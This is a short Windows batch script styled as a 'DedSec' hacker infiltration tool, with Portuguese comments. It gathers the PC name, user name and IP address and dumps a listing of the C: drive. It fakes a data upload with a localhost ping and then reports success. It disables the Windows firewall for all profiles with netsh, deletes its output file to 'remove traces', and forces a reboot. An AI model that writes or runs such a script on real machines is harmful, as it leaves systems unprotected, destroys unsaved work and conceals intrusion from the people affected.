@echo off
title DedSec Infiltration Script
color 0a
echo [DEDSEC] Initializing...

:: Variáveis para pegar informações do sistema
set PCName=%COMPUTERNAME%
set UserName=%USERNAME%
set IPAddress=
for /f "tokens=2 delims=:" %%A in ('ipconfig ^| findstr "IPv4"') do set IPAddress=%%A

:: Mostrar informações obtidas
echo [INFO] PC Name: %PCName%
echo [INFO] User Name: %UserName%
echo [INFO] IP Address: %IPAddress%

:: Coletar informações do diretório e enviar para um servidor
echo [DEDSEC] Coletando informações do sistema...
dir C:\ > C:\SystemInfo.txt
echo [INFO] Informações do sistema coletadas em SystemInfo.txt

:: Simular exfiltração de dados
echo [DEDSEC] Enviando dados...
:: Aqui, poderia haver um comando para enviar via FTP ou uma API
ping -n 3 127.0.0.1 > nul
echo [DEDSEC] Dados enviados com sucesso.

:: Desativar um serviço do Windows (exemplo: desabilitar firewall)
echo [DEDSEC] Desabilitando o firewall...
netsh advfirewall set allprofiles state off
echo [INFO] Firewall desativado.

:: Remover rastros
echo [DEDSEC] Removendo rastros...
del C:\SystemInfo.txt
cls
echo [INFO] Rastos removidos.

:: Encerrar
echo [DEDSEC] Operação concluída.
shutdown /r /f /t 10
